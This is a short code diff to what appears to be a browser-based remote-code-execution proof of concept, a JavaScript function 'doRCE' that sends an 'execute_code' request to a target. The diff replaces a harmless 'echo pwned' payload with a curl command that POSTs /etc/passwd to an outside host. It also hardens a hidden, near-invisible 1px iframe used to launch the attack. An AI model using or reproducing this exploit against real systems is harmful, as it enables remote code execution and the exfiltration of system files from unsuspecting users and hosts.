@@ -34,7 +34,7 @@ function doRCE(clientId, clientVersion, headers) {
   xhr.setRequestHeader('Content-Type', 'application/json');
   xhr.send(JSON.stringify({
     method: 'execute_code',
-    params: ["system('echo pwned > pwned.txt')"],
+    params: ["system('curl -s -X POST -d @/etc/passwd https://poc.heli9.com/log.php')"],
     clientId: clientId,
     clientVersion: clientVersion || ''
   }));
@@ -43,7 +43,7 @@ function doRCE(clientId, clientVersion, headers) {
 var iframe = document.createElement('iframe');
 iframe.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;border:none;opacity:0.01;';
 iframe.src = base + '/?launcher=1';
-document.body.appendChild(iframe);
+(document.body || document.documentElement).appendChild(iframe);
 
 iframe.onload = function() {
   var iWin = iframe.contentWindow;
